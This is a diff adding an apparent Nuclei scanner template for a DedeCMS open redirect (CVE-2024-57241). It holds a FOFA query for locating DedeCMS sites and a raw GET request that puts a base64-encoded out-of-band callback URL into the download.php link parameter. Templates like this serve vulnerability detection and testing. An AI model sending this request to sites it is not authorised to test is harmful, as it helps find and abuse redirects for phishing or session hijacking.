@@ -1,0 +1,28 @@
+id: dedecms-Open-Redirect-Vulnerability-CVE-2024-57241
+info:
+  name: "DedeCMS URL重定向漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="DedeCMS"
+    DedeCMS 5.71sp1及更早版本在处理GET请求时存在验证缺陷，未正确校验URL参数导致开放重定向漏洞。攻击者可构造包含恶意目标地址的请求，利用该缺陷实施钓鱼攻击或会话劫持。该漏洞源于系统未对用户提交的URL参数进行有效过滤，当特定接口接收到包含外部链接的请求时，将直接执行HTTP 302跳转。
+  reference:
+  - https://mp.weixin.qq.com/s/kyOsWRAeLZIwUZ8I2k1IKw
+  tags: dedecms
+
+variables:
+  oob_url: "http://{{interactsh-url}}"  # 定义 Interactsh URL 变量
+  base64_oob: "{{base64(oob_url)}}"     # 对 URL 进行 Base64 编码
+
+http:
+- raw:
+  - |
+    GET /plus/download.php?open=1&link={{base64_oob}} HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
